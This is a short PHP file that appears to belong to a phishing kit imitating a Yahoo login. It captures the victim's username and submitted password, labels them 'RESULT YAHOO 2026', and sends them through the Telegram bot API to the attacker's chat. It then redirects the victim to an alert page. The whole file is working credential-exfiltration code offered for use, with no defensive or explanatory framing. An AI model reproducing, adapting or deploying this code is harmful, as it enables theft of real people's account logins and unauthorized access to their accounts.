<?php
include "../telegram.php";
session_start();
$uname = "<code>".$_SESSION['uname']."</code>";
$pass = "<code>".$_POST['password']."</code>";
$_SESSION['pass'] = $pass;
$message = "
( RESULT YAHOO 2026🔥 )

- Username : ".$uname."
- Password : ".$pass."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../alert.php');
?>